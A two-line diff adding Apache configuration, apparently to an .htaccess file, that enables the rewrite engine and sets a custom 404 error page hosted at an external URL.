@@ -1,0 +1,2 @@
+RewriteEngine on
+ErrorDocument 404 https://i.e-henry.com/vanishtext/404.html
